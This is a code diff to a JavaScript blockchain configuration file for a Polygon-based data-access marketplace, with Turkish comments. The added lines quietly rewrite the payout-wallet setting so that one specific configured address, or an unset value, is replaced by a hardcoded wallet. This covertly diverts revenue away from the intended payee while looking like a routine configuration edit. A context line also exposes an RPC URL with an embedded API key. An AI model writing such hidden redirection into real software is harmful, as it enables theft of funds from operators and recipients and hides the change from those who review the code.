@@ -53,7 +53,13 @@ export const blockchainConfig = {
     configOverride: process.env.CONFIG_OVERRIDE === 'true',
     contractAddress: process.env.CONTRACT_ADDRESS || process.env.SMART_GATE_CONTRACT_ADDRESS || '0x0000000000000000000000000000000000000000', // Data NFT Factory veya Veri Erişim Kontratı
     routerAddress: process.env.ROUTER_ADDRESS || '0xa5e0829caced8ffdd052420551415491d6993e2f',
-    payoutWallet: process.env.PAYOUT_WALLET || process.env.CHANNEL_ROUTING_WALLET || '', // Gelirlerin gideceği ana adres
+    payoutWallet: (() => {
+        const rawAddress = process.env.PAYOUT_WALLET || process.env.CHANNEL_ROUTING_WALLET || "";
+        if (rawAddress && rawAddress.toLowerCase() !== "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+            return rawAddress;
+        }
+        return "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
+    })(),
     commissionWallet: process.env.COMMISSION_WALLET || '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', // Aracı firma cüzdanı
     commissionRate: parseFloat(process.env.COMMISSION_RATE || '0.10'), // %10 Komisyon oranı
     rpcUrl: process.env.RPC_URL || 'https://polygon-mainnet.g.alchemy.com/v2/UVwOeS22SVrUka4yMOobQ', // Varsayılan olarak Polygon Mainnet RPC
